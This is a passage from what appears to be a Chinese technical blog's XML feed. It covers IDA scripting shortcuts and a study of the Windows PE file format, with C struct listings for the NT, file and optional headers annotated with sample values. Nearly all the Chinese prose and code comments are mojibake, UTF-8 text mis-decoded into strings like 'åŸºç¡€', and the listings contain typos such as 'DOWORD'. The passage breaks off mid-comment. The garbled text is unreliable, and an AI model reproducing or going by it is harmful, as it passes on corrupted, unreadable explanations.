ctrl+F3ï¼›æŸ¥çœ‹æœ€è¿‘è„šæœ¬æ–‡ä»¶ï¼šalt+F9</p></blockquote><ol><li><p>æ‰§è¡Œæ–¹æ³•ï¼šä½¿ç”¨shift+F2å¿«æ·é”®ï¼Œè¾“å…¥è¯­å¥å runï¼›æˆ–è€…ç›´æ¥ï¼ˆalt+F7ï¼‰æ·»åŠ  scriptï¼Œç„¶åæ‰§è¡Œã€‚</p></li><li><p>idcä¸­çš„è¯­æ³•å¤§å¤šä¸Cè¯­è¨€ç±»ä¼¼ã€‚è¿™é‡Œæ€»ç»“ä¸€äº›ç‰¹æ®Šçš„ã€‚</p><ul><li><p>messageä¸Cè¯­è¨€printf ç”¨æ³•ç›¸åŒã€‚</p></li><li><p>idcä¸­çš„å˜é‡éƒ½å®šä¹‰ä¸ºï¼šauto å˜é‡åï¼›å­—ç¬¦ä¸²å¯ä»¥ç›´æ¥ç”¨ + å·è¿æ¥ï¼ˆauto s = â€œidaâ€ + â€œidcâ€;ï¼‰ï¼›æ”¯æŒåˆ‡ç‰‡æ“ä½œã€‚</p></li><li><p>æ¡ä»¶è¡¨è¾¾å¼ä¸­switchä¸æ”¯æŒã€‚</p></li><li><p>idcä¸­å‡½æ•°ä¸éœ€è¦æŒ‡æ˜ç±»å‹ï¼Œä½†å¿…é¡»éƒ½å®šä¹‰ä¸ºé™æ€ï¼ˆstatic main(){ }ï¼‰ã€‚</p></li></ul></li></ol><h3 id="Pythonè„šæœ¬"><a href="#Pythonè„šæœ¬" class="headerlink" title="Pythonè„šæœ¬"></a>Pythonè„šæœ¬</h3><ul><li>shift+f2ï¼šæ‰“å¼€å†™è„šæœ¬çš„çª—å£</li><li>alt+f7ï¼šè½½å…¥æ‰§è¡Œä¸€ä¸ªè„šæœ¬</li></ul>]]></content>
      
      
      <categories>
          
          <category> å·¥å…· </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PEå­¦ä¹ </title>
      <link href="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/05/30/PE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-åŸºç¡€æ¦‚å¿µ"><a href="#0x1-åŸºç¡€æ¦‚å¿µ" class="headerlink" title="0x1 åŸºç¡€æ¦‚å¿µ:"></a>0x1 åŸºç¡€æ¦‚å¿µ:</h2><table><thead><tr><th>EXEæ–‡ä»¶å’ŒDLLæ–‡ä»¶åŸºæœ¬ä¸Šåªæ˜¯è¯­ä¹‰ä¸Šçš„åŒºåˆ«, å”¯ä¸€åŒºåˆ«æ˜¯æœ‰ä¸€ä¸ªæ ‡è¯†å­—æ®µæŒ‡å‡ºEXEæˆ–DLL, å¸¸è§çš„PEæ–‡ä»¶æ ¼å¼æœ‰:DLLï¼ŒEXEï¼ŒOCXï¼ŒSYS, SCR, CPL, OBJç­‰</th></tr></thead><tbody><tr><td><strong>64ä½çš„PEæ–‡ä»¶æ ¼å¼, åšäº†ç®€å•çš„ä¿®é¥°, å«PE32+/PE+, 32ä½å­—æ®µæ‰©å±•ä½64å­—æ®µ</strong></td></tr><tr><td><strong>PEæ ¼å¼çš„å®šä¹‰åœ°æ–¹åœ¨ <code>winnt.h</code> å¤´æ–‡ä»¶ä¸­æˆ‘ä»¬èƒ½åœ¨å…¶ä¸­æ‰¾åˆ°PEæ–‡ä»¶çš„å®šä¹‰</strong>  <strong><em>å¦‚ä¸‹å›¾VCçš„è·¯å¾„æŸ¥æ‰¾</em></strong>  <a id="more"></a></td></tr><tr><td><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200507103628502-1590826740464.png" alt="image-20200507103628502"></td></tr><tr><td><strong>VAæ˜¯è¿›ç¨‹è™šæ‹Ÿå†…å­˜çš„ç»å¯¹åœ°å€, RVAæ˜¯ç›¸å¯¹è™šæ‹Ÿåœ°å€      RVA+ImageBase = VA</strong></td></tr><tr><td><strong>32ä½çš„Windows OSä¸­, å„è¿›ç¨‹éƒ½åˆ†é…æœ‰4GBçš„è™šæ‹Ÿå†…å­˜, æ‰€ä»¥VAèŒƒå›´: 00000000 ~ FFFFFFFF</strong></td></tr></tbody></table><p>PEæ–‡ä»¶æ€»ä½“æ¡†æ¶.</p><p><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200520084527063-1590826622690.png" alt="image-20200520084527063"></p><p>PEæ–‡ä»¶æ‰§è¡Œé¡ºåº.</p><table><thead><tr><th>1.æ‰§è¡Œä¸€ä¸ªPEæ–‡ä»¶æ—¶, PEè£…è½½å™¨é¦–å…ˆä¼šæ‰¾DOSå¤´ç­¾å(MZ),æ£€æŸ¥æ˜¯å¦æœ‰æ•ˆ,  ç„¶åæ˜¯DOSå¤´é‡Œçš„æ‰¾ e_lfanew(æœ€åä¸€ä¸ªæˆå‘˜, æŒ‡ç¤ºPEå¤´çš„), å¦‚æœæ‰¾åˆ°, åˆ™ç›´æ¥è·³è½¬.</th></tr></thead><tbody><tr><td><strong>2.æ‰¾åˆ°PEå¤´, å¼€å§‹æ£€æŸ¥PEå¤´ä¿¡æ¯å±æ€§æ˜¯å¦æœ‰æ•ˆ, å¦‚æœæœ‰æ•ˆ, å°±è·³è½¬åˆ°PEå¤´å°¾éƒ¨.</strong></td></tr><tr><td><strong>3.ç´§è·ŸPEå¤´å°¾éƒ¨çš„æ˜¯èŠ‚è¡¨, PEè£…è½½å™¨å¼€å§‹è¯»å–èŠ‚è¡¨ä¸­è®°å½•äº†æ¯ä¸ªå±æ€§çš„ä¿¡æ¯. å¹³ä¸”é‡‡ç”¨æ–‡ä»¶æ˜ å°„å°†è¿™äº›èŠ‚æ˜ å°„åˆ°å†…å­˜.    <u>æ–‡ä»¶æ˜ å°„: åœ¨æ‰§è¡Œä¸€ä¸ªPEæ–‡ä»¶çš„æ—¶å€™ï¼ŒWindowså¹¶ä¸åœ¨ä¸€å¼€å§‹å°±å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥å†…å­˜,è€Œæ˜¯é‡‡ç”¨ä¸å†…å­˜æ˜ å°„çš„æœºåˆ¶,ä¹Ÿå°±æ˜¯è¯´ï¼ŒWindowsè£…è½½å™¨åœ¨è£…è½½çš„æ—¶å€™ä»…ä»…å»ºç«‹å¥½è™šæ‹Ÿåœ°å€å’ŒPEæ–‡ä»¶ä¹‹é—´çš„æ˜ å°„å…³ç³»,åªæœ‰çœŸæ­£æ‰§è¡Œåˆ°æŸä¸ªå†…å­˜é¡µä¸­çš„æŒ‡ä»¤æˆ–è€…è®¿é—®æŸä¸€é¡µä¸­çš„æ•°æ®æ—¶,è¿™ä¸ªé¡µé¢æ‰ä¼šè¢«ä»ç£ç›˜æäº¤åˆ°ç‰©ç†å†…å­˜,è¿™ç§æœºåˆ¶ä½¿æ–‡ä»¶è£…å…¥çš„é€Ÿåº¦å’Œæ–‡ä»¶å¤§å°æ²¡æœ‰å¤ªå¤§çš„å…³ç³»</u></strong></td></tr><tr><td><strong>4.PEæ–‡ä»¶æ˜ å°„å…¥å†…å­˜å, PEè£…è½½å™¨ç»§ç»­å¤„ç†ä¸€äº›é€»è¾‘ç»“æ„, å¦‚è¾“å…¥è¡¨çš„ä¿®æ­£.</strong></td></tr></tbody></table><h2 id="0x2-MS-DOSå¤´éƒ¨åŠDOSå­˜æ ¹"><a href="#0x2-MS-DOSå¤´éƒ¨åŠDOSå­˜æ ¹" class="headerlink" title="0x2 MS-DOSå¤´éƒ¨åŠDOSå­˜æ ¹"></a>0x2 MS-DOSå¤´éƒ¨åŠDOSå­˜æ ¹</h2><table><thead><tr><th>DOSå¤´çš„ä½œç”¨æ˜¯å…¼å®¹MS-DOSæ“ä½œç³»ç»Ÿä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶, è¯¥ç»“æ„ä½“å¤§å°ä¸º64å­—èŠ‚(0x40)</th></tr></thead><tbody><tr><td><strong>2ä¸ªé‡è¦æˆå‘˜ e_magic(DOSå¤´ç¬¬ä¸€ä¸ªæˆå‘˜): DOSç­¾å(4D5A -&gt; ASCIIå€¼ MZ)    e_lfanew(DOSå¤´æœ€åä¸€ä¸ªæˆå‘˜): æŒ‡ç¤ºNTå¤´çš„åç§», ä»è¿™é‡Œæ‰¾åˆ°PEå¤´(å–å†³äºDOSå­˜æ ¹å¤§å°)</strong></td></tr><tr><td><strong>DOSå­˜æ ¹æ˜¯DOSå¤´ä¸PEæ–‡ä»¶å¤´ä¸­é—´éƒ¨åˆ†çš„å†…å®¹, ä¸º16ä½çš„æ±‡ç¼–æŒ‡ä»¤ç»„æˆ, æ—¢æœ‰ä»£ç ä¹Ÿæœ‰æ•°æ®, å¤§å°ä¸å›ºå®š</strong></td></tr><tr><td><strong>æˆ‘ä»¬çŸ¥é“DOSå­˜æ ¹çš„å†…å®¹æ˜¯å½“æˆ‘ä»¬çš„ç¨‹åºåœ¨DOSç¯å¢ƒä¸­è¿è¡Œæ—¶æ‰§è¡Œçš„ä»£ç , ä¹Ÿå°±æ˜¯ç»™ä¸€ä¸ªæç¤ºä¿¡æ¯:<code>This is program cannot be run in DOS mode</code>, é‚£æˆ‘ä»¬æ˜¯å¯ä»¥éšä¾¿å°†å…¶å†…å®¹ä¿®æ”¹ä¸ºè‡ªå·±æƒ³å¡«å……çš„ä¸œè¥¿, åæ­£ä¸ä¼šå½±å“åœ¨window osä¸­çš„è¿è¡Œ,  ä½†è®°ä½è¿™ä¸ªå¤§å°æ˜¯ä¸èƒ½ä¿®æ”¹çš„, ä¼šå½±å“åé¢æŒ‡ä»¤ç´¢å¼•åœ°å€è·Ÿç€å‡ºé”™, æœ€åç¨‹åºå´©æºƒ(åˆšå¼€å§‹å­¦ä¹ æ—¶åœ¨ä¸€é“é€†å‘é¢˜ä¸­, å°±çŠ¯äº†è¿™ä¸ªé”™)</strong>      <strong>å¦‚ä¸‹å›¾æ‰€ç¤ºODç¨‹åº, é‡è¦å­—æ®µå·²æ ‡å‡º(DOSå­˜æ ¹ä»0x40 - 0x1FF)</strong></td></tr><tr><td><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200508155307169-1590826775538.png" alt="image-20200508155307169"></td></tr></tbody></table><h2 id="0x3-NTå¤´"><a href="#0x3-NTå¤´" class="headerlink" title="0x3 NTå¤´"></a>0x3 NTå¤´</h2><p><strong>åˆ†åˆ«ä»‹ç»3ä¸ªç»“æ„ä½“</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DOWORD Signature;</span><br><span class="line">    <span class="comment">//PEå¤´çš„æ ‡å¿— 50450000</span></span><br><span class="line">    </span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    <span class="comment">//æ–‡ä»¶å¤´  size: 0xF8  è®°è½½æ–‡ä»¶çš„å¤§éƒ¨åˆ†å±æ€§</span></span><br><span class="line">    </span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">    <span class="comment">//å¯é€‰å¤´  very important</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">     WORD    Machine;</span><br><span class="line">     <span class="comment">//æŒ‡å‡ºè¯¥PEæ–‡ä»¶è¿è¡Œçš„å¹³å°,æ¯ä¸ªCPUéƒ½æœ‰å”¯ä¸€çš„æ ‡è¯†ç ,ä¸€èˆ¬0x14c(x86)</span></span><br><span class="line">     <span class="number">014</span>C</span><br><span class="line">            </span><br><span class="line">     WORD    NumberOfSections; </span><br><span class="line">     <span class="comment">//æŒ‡å‡ºæ–‡ä»¶ä¸­å­˜åœ¨çš„èŠ‚åŒºæ•°é‡ æ³¨:è¿™é‡Œçš„å®šä¹‰ä¸€å®šè¦ç­‰äºå®é™…</span></span><br><span class="line">     <span class="comment">//å¤§å°, ä¸ç„¶ç¨‹åºä¼šè¿è¡Œå¤±è´¥</span></span><br><span class="line">     <span class="number">0008</span>      </span><br><span class="line">         </span><br><span class="line">     DWORD   TimeDateStamp;</span><br><span class="line">     <span class="comment">//PEæ–‡ä»¶çš„åˆ›å»ºæ—¶é—´ï¼Œä¸€èˆ¬æœ‰è¿æ¥å™¨å¡«å†™ UTCï¼ˆä¸–ç•Œæ ‡å‡†æ—¶é—´ï¼‰è¿›</span></span><br><span class="line">     <span class="comment">//è¡Œå­˜å‚¨ ä»1970å¹´1æœˆ1æ—¥00:00:00ç®—èµ·çš„ç§’æ•°å€¼ æˆ‘ä»¬å¯ä»¥ç”¨C</span></span><br><span class="line">     <span class="comment">//è¯­è¨€çš„localtime()å‡½æ•°(æ—¶åŒºä¹Ÿä¼šè½¬æ¢)è®¡ç®—.</span></span><br><span class="line">     <span class="number">40B</span>10868  </span><br><span class="line">         </span><br><span class="line">     DWORD   PointerToSymbolTable;</span><br><span class="line">     <span class="comment">//æŒ‡å‘ç¬¦å·è¡¨COFFçš„æŒ‡é’ˆ, ç”¨äºè°ƒè¯•ä¿¡æ¯. å‘ç°æ¯æ¬¡çœ‹éƒ½æ˜¯0</span></span><br><span class="line">     <span class="number">00000000</span></span><br><span class="line">         </span><br><span class="line">     DWORD   NumberOfSymbols;</span><br><span class="line">     <span class="comment">//ç¬¦å·è¡¨æ•°é‡. å‘ç°æ¯æ¬¡çœ‹éƒ½æ˜¯0</span></span><br><span class="line">     <span class="number">00000000</span></span><br><span class="line">         </span><br><span class="line">     WORD    SizeOfOptionalHeader;</span><br><span class="line">     <span class="comment">//æŒ‡å‡ºPEçš„IMAGE_OPTIONAL_HEADER32ç»“æ„ä½“æˆ–è€…</span></span><br><span class="line">     <span class="comment">//PE+æ ¼å¼æ–‡ä»¶çš„IMAGE_OPTIONAL_HEADER64ç»“æ„ä½“çš„é•¿åº¦</span></span><br><span class="line">     <span class="comment">//è¿™ä¸¤ä¸ªç»“æ„ä½“å°ºå¯¸æ˜¯ä¸ç›¸åŒçš„ï¼Œæ‰€ä»¥éœ€è¦SizeOfOptionalHeader</span></span><br><span class="line">     <span class="comment">//ä¸­æŒ‡æ˜å¤§å°32ä½é€šå¸¸ä½: E0  64ä½é€šå¸¸ä¸º: F0(ä¸æ˜¯ç»å¯¹çš„)</span></span><br><span class="line">     <span class="comment">//å®ƒä»¬åªæ˜¯æœ€å°å€¼ï¼Œå¯èƒ½æœ‰æ›´å¤§çš„å€¼</span></span><br><span class="line">     <span class="number">00E0</span>    </span><br><span class="line">         </span><br><span class="line">     WORD    Characteristics;</span><br><span class="line">     <span class="comment">//æ ‡è¯†æ–‡ä»¶çš„å±æ€§, æ–‡ä»¶æ˜¯å¦å¯è¿è¡Œ, æ˜¯å¦ä¸ºDLLæ–‡ä»¶ç­‰.</span></span><br><span class="line">     <span class="comment">//äºŒè¿›åˆ¶ä¸­æ¯ä¸€ä½ä»£è¡¨ä¸åŒå±æ€§, ä»¥ bit oRå½¢å¼ç»“åˆèµ·æ¥</span></span><br><span class="line">     <span class="comment">//2ä¸ªéœ€è¦è®°ä½çš„å€¼. 0002h:.exeæ–‡ä»¶  2000h: .dllæ–‡ä»¶ </span></span><br><span class="line">     <span class="number">010</span>E        </span><br><span class="line">          </span><br><span class="line"> &#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class="line"> </span><br><span class="line"> ä¸‹å›¾ä¸ºODç¨‹åºçš„æ–‡ä»¶å¤´. åœ¨ä¸Šé¢æ¯ä¸ªæˆå‘˜ä¸‹é¢ä¾æ¬¡æ ‡å‡º.</span><br></pre></td></tr></table></figure><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200507203805570-1590826622690.png" alt="image-20200507203805570"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DATA_DIRECTORY</span>////å®šä¹‰äº†<span class="title">DataDirectory</span>çš„ç»“æ„ä½“ </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DOWORD VirtualAddress;</span><br><span class="line">    <span class="comment">//è¯¥ç»“æ„ä½“çš„RVA</span></span><br><span class="line">    </span><br><span class="line">    DOWORD Size;</span><br><span class="line">    <span class="comment">//è¯¥ç»“æ„ä½“çš„å¤§å°</span></span><br><span class="line">&#125;IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>   </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    <span class="comment">//è¿™ä¸ªå¯é€‰å¤´çš„ç±»å‹  PE: 10Bh   PE+: 20Bh  å¯ä»¥ä¾æ¬¡åŒºåˆ†æ˜¯32ä½è¿˜æ˜¯64ä½</span></span><br><span class="line">    <span class="number">010B</span></span><br><span class="line">    </span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    <span class="comment">//é“¾æ¥å™¨çš„ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">05</span></span><br><span class="line">    </span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    <span class="comment">//é“¾æ¥å™¨çš„å°ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">00</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    <span class="comment">//ä»£ç æ®µçš„é•¿åº¦</span></span><br><span class="line">    <span class="number">000</span>AF000</span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–çš„æ•°æ®é•¿åº¦</span></span><br><span class="line">    <span class="number">0008</span>EC00</span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    <span class="comment">//æœªåˆå§‹åŒ–çš„æ•°æ®é•¿åº¦</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    <span class="comment">//ç¨‹åºEPçš„RVA, æŒ‡å‡ºç¨‹åºæœ€å…ˆæ‰§è¡Œä»£ç çš„èµ·å§‹åœ°å€ (å¾ˆé‡è¦)</span></span><br><span class="line">    <span class="number">00000100</span></span><br><span class="line">    </span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    <span class="comment">//ä»£ç æ®µèµ·å§‹åœ°å€çš„RVA</span></span><br><span class="line">    <span class="number">00000100</span></span><br><span class="line">    </span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line">    <span class="comment">//æ•°æ®æ®µèµ·å§‹åœ°å€çš„RVA</span></span><br><span class="line">    <span class="number">000B</span>0000</span><br><span class="line">    </span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    <span class="comment">//VA: 0~FFFFFFFF(32ä½ç³»ç»Ÿ).PEæ–‡ä»¶åŠ è½½åˆ°è™šæ‹Ÿå†…å­˜æ—¶, æŒ‡å‡ºæ–‡ä»¶ä¼˜å…ˆè£…å…¥åœ°å€</span></span><br><span class="line">    <span class="comment">//EXE, DLLæ–‡ä»¶è¢«è£…è½½åˆ°0~7FFFFFFF</span></span><br><span class="line">    <span class="comment">//SYSæ–‡ä»¶è½½å…¥å†…æ ¸å†…å­˜çš„ 80000000~FFFFFFFF</span></span><br><span class="line">    <span class="comment">//æ‰§è¡ŒPEæ–‡ä»¶æ—¶,PEè£…è½½å™¨ä¼šæŠŠEIPè®¾ç½®ä¸º: ImageBase+AddressOfEntrypoint</span></span><br><span class="line">    <span class="number">00400000</span>    </span><br><span class="line">         </span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    <span class="comment">//èŠ‚åœ¨å†…å­˜ä¸­çš„æœ€å°å•ä½ (å¯¹é½å•ä½) ä¸€èˆ¬ä¸º: 1000h</span></span><br><span class="line">    <span class="number">00001000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    <span class="comment">//èŠ‚åœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„æœ€å°å•ä½ (å¯¹é½å•ä½) ä¸€èˆ¬ä¸º: 200h</span></span><br><span class="line">    <span class="comment">//ä¸€èˆ¬SectionAlignment &lt;= FileAlignment,èŠ‚çœå‚¨å­˜ç©ºé—´.</span></span><br><span class="line">    <span class="number">00000200</span>     </span><br><span class="line">    </span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    <span class="comment">//æ“ä½œç³»ç»Ÿä¸»ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">0004</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    <span class="comment">//æ“ä½œç³»ç»Ÿå°ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    <span class="comment">//æ˜ è±¡æ–‡ä»¶ä¸»ç‰ˆæœ¬å·, è¿™ä¸ªæ˜¯å¼€å‘è€…è‡ªå·±æŒ‡å®šçš„ï¼Œç”±è¿æ¥å™¨å¡«å†™(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    <span class="comment">//æ˜ è±¡æ–‡ä»¶å°ç‰ˆæœ¬å·(ä¸é‡è¦)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    <span class="comment">//å­ç³»ç»Ÿç‰ˆæœ¬å·</span></span><br><span class="line">    <span class="number">0004</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    <span class="comment">//å­ç³»ç»Ÿå°ç‰ˆæœ¬å·</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    <span class="comment">//Win32ç‰ˆæœ¬å€¼ ç›®å‰çœ‹è¿‡çš„æ–‡ä»¶éƒ½æ˜¯ 0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    <span class="comment">//æŒ‡å®šPE imageåœ¨è™šæ‹Ÿå†…å­˜ä¸­æ‰€å ç©ºé—´çš„å¤§å° SectionAlignmentçš„å€æ•°</span></span><br><span class="line">    <span class="number">00180000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    <span class="comment">//æŒ‡å‡ºæ•´ä¸ªPEå¤´çš„å¤§å°(FileAlignmentæ•´æ•°å€)</span></span><br><span class="line">    <span class="comment">//å®ƒä¹Ÿæ˜¯ä»æ–‡ä»¶çš„å¼€å¤´åˆ°ç¬¬ä¸€èŠ‚çš„åŸå§‹æ•°æ®çš„åç§»é‡, å¯ä»¥æ‰¾åˆ°ç¬¬ä¸€èŠ‚åŒº</span></span><br><span class="line">    <span class="number">00000600</span>   </span><br><span class="line">    </span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    <span class="comment">//æ˜ è±¡æ–‡ä»¶çš„æ ¡éªŒå’Œ ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢è½½å…¥æ— è®ºå¦‚ä½•éƒ½ä¼šå†²çªçš„ã€å·²æŸåçš„äºŒè¿›åˆ¶æ–‡ä»¶</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    <span class="comment">//è¯´æ˜æ˜ åƒæ–‡ä»¶åº”è¿è¡Œäºä»€ä¹ˆæ ·çš„NTå­ç³»ç»Ÿä¹‹ä¸Š</span></span><br><span class="line">    <span class="comment">//è¯¥å€¼ç”¨æ¥åŒºåˆ†ç³»ç»Ÿé©±åŠ¨æ–‡ä»¶(*.sys)ä¸æ™®é€šçš„å¯æ‰§è¡Œæ–‡ä»¶(*.exe, *.dll)</span></span><br><span class="line">    <span class="comment">//value: 1   å«ä¹‰: Driveræ–‡ä»¶  tips: ç³»ç»Ÿé©±åŠ¨(å¦‚: ntfs.sys)</span></span><br><span class="line">    <span class="comment">//value: 2   å«ä¹‰: GUIæ–‡ä»¶  tips: 